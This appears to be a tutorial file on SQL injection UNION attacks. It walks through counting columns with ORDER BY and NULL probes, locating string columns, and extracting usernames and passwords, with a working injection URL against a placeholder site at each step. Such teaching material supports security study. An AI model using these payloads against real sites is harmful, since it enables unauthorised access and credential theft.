SECTION A: UNION ATTACKS
1. Determining the number of columns required in an SQL injection UNION attack

For UNION attacks, it is important to know how many columns are returned from the original query.

The first method is appending an ORDER BY statement to your URL.  An ORDER BY statement orders the rows by a specific column, from 1 to n columns.

Say that a query returns 4 columns. (You do not know this yet).  Any of these urls will return the table, though it may be ordered differently each time.
https://www.website.com/products?category=Category1'+ORDER+BY+1--
https://www.website.com/products?category=Category1'+ORDER+BY+2--
https://www.website.com/products?category=Category1'+ORDER+BY+3--
https://www.website.com/products?category=Category1'+ORDER+BY+4--

The URL below, however, will return an error.
https://www.website.com/products?category=Category1'+ORDER+BY+5--

This will tell you that the query returns 4 columns.

KEY: Error on ORDER BY n+1 statement and higher.

You can also do this with NULL statements.

The 3 queries below will return an error:
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL--
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL--
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL--

The URL below will return the table along with an empty row.
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL,NULL--

This also indicates to you that there are 4 columns.

KEY: Error on all UNION SELECT n*NULL except when n = the amount of columns in the returned query.


2. Finding columns with a useful data type in an SQL injection UNION attack

Another useful piece of knowledge you as an attacker will want to know in a UNION attack is where string data types can be returned inside the table.  Each column in a table
has a certain data type.  For example, a column that is designated for integer cannot have the string 'helloworld' inside of it.

To find a column that returns strings, you have to do a test similar to finding how many columns are in the table.  It is easier to find columns that have strings in
it if you first know how many columns there are, so I suggest you use (1.) in this file to find out how many columns your query returns.

To find how many columns are returned in the query, you constructed a url that returned a table with an additional row, thus the query returns 3 columns:
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL--

To find out which of the three columns returned strings, use the following urls:
https://www.website.com/products?category=Category1'+UNION+SELECT+'helloworld',NULL,NULL-- (Test 1)
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,'helloworld',NULL-- (Test 2)
https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,'helloworld'-- (Test 3)

For each test, if it did not return an error but instead returned a table with 'helloworld' appearing in it, it will indicate to you which columns return strings.

KEY:
Test 1 successful means the first column contains string types.
Test 2 unsuccessful means the second column does not contain string types.

3. Using an SQL injection UNION attack to retrieve interesting data

Now that you know that you have can perform a UNION attack on x amount of columns, let's do the actual attack.  Say you have a query returning 2 columns.  There may be
another table in the server's database that contains usernames and passwords.  To try and get all the usernames and passwords, a url like this can be constructed:
https://www.website.com/products?category=Category1'+UNION+SELECT+username,password+FROM+users--

This will return not only the products but the usernames and passwords.
